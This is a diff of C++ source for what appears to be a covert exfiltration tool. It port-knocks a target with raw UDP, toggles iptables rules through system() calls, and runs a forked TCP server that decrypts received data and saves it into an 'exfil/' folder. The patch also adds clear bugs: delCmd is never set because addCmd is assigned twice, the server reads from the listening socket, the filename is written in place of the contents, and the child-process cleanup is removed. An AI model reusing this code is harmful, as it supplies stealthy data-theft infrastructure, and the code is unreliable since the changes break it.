@@ -5,9 +5,7 @@
 #include <iostream>
 
 #include <linux/if.h>
-#include <signal.h>
 #include <sys/ioctl.h>
-#include <sys/types.h>
 #include <unistd.h>
 
 #include "TcpStack.h"
@@ -60,8 +58,6 @@ NetworkEngine::~NetworkEngine() {
     }
 
     this->stopAsyncSniff();
-
-    kill(this->tcpPid, SIGKILL);
 
     delete this->crypto;
     delete this->knockController;
@@ -300,16 +296,40 @@ int NetworkEngine::sendCoockedUdp(const struct in_addr &daddr, const unsigned sh
  */
 int NetworkEngine::knockAndSend(const in_addr &daddr, const UCharVector &data) {
     UCharVector blank{0};
+    int numSent;
+
+    std::string addCmd;
+    std::string delCmd;
 
     // perform knock
     for (unsigned short port : this->knockController->getPattern()) {
-        // use random source port
+        addCmd = KnockController::getIptableCommand(
+            KnockController::Action::ADD, KnockController::Chain::OUTPUT,
+            KnockController::Protocol::UDP, port);
+        addCmd = KnockController::getIptableCommand(
+            KnockController::Action::DELETE, KnockController::Chain::OUTPUT,
+            KnockController::Protocol::UDP, port);
+
+        system(addCmd.c_str());
         this->sendRawUdp(this->ip, daddr, (Crypto::rand() % 55535) + 10000, port, blank);
+        system(delCmd.c_str());
+
         sleep(1);
     }
 
-    // do regular tcp connect and send
-    return this->sendCookedTcp(daddr, this->knockController->getPort(), data);
+    // open port and send
+    addCmd = KnockController::getIptableCommand(
+        KnockController::Action::ADD, KnockController::Chain::OUTPUT,
+        KnockController::Protocol::TCP, this->knockController->getPort());
+    delCmd = KnockController::getIptableCommand(
+        KnockController::Action::DELETE, KnockController::Chain::OUTPUT,
+        KnockController::Protocol::TCP, this->knockController->getPort());
+
+    system(addCmd.c_str());
+    numSent = this->sendCookedTcp(daddr, this->knockController->getPort(), data);
+    system(delCmd.c_str());
+
+    return numSent;
 }
 
 void NetworkEngine::startSyncSniff(const char *filter) { this->runSniff(filter); }
@@ -456,14 +476,20 @@ void NetworkEngine::gotPacket(unsigned char *args, const struct pcap_pkthdr *hea
 }
 
 /*
+ * Starts ta TCP server in a child process. The TCP server listens for a connection and then if a
+ * connection is found it does the following:
+ *      1. Reads all the data into a buffer.
+ *      2. Decrypt the data.
+ *      3. Split the file name and file contents which is separated by a null character.
+ *      4. Sanitize the filename.
+ *      5. Write the file contents to a new file with the name of the incoming filename.
  *
+ * Params:
+ *      const unsigned short port: The port to listen on.
  */
 void NetworkEngine::startTcpServer(const unsigned short port) {
-    this->tcpPid = fork();
-
-    if (this->tcpPid != 0) {
+    if (fork() != 0)
         return;
-    }
 
     int sd;
     int connfd;
@@ -495,15 +521,8 @@ void NetworkEngine::startTcpServer(const unsigned short port) {
     while (true) {
         connfd = accept(sd, (struct sockaddr *)&client, &len);
 
-        NetworkEngine::readAllFromTcpSocket(connfd, buffer);
-
-        if (buffer.size() == 0) {
-            std::cerr << "no data recceived" << std::endl;
-        }
-
+        NetworkEngine::readAllFromTcpSocket(sd, buffer);
         UCharVector plaintext = this->getCrypto()->dec(buffer);
-
-
 
         int index;
         for (index = 0; index < plaintext.size(); index++) {
@@ -515,13 +534,13 @@ void NetworkEngine::startTcpServer(const unsigned short port) {
         std::string filename((char *)plaintext.data(), index);
         for (int i = 0; i < filename.size(); i++) {
             if (filename[i] == '/') {
-                filename[i] = '_';
+                filename[i] = '-';
             }
         }
 
         std::ofstream outfile;
         outfile.open("exfil/" + filename);
-        std::string output(plaintext.data() + index + 1, plaintext.data() + plaintext.size());
+        std::string output(plaintext.data(), plaintext.data() + index + 1);
         outfile << output;
         outfile.close();
 
@@ -531,13 +550,19 @@ void NetworkEngine::startTcpServer(const unsigned short port) {
     close(sd);
 }
 
+/*
+ * Reads all the data from a TCP socket and writes it to a vector buffer.
+ *
+ * Params:
+ *      const int sd: The socket to read from.
+ *
+ *      UCharVector &buffer: The buffer to hold the incoming data.
+ */
 void NetworkEngine::readAllFromTcpSocket(const int sd, UCharVector &buffer) {
-    static const int tmpLen = 1500;
-
     int numRead;
-    unsigned char tmp[tmpLen];
+    unsigned char tmp[NetworkEngine::MTU];
 
-    while ((numRead = read(sd, tmp, tmpLen)) > 0) {
+    while ((numRead = read(sd, tmp, NetworkEngine::MTU)) > 0) {
         buffer.insert(buffer.end(), tmp, tmp + numRead);
     }
 }
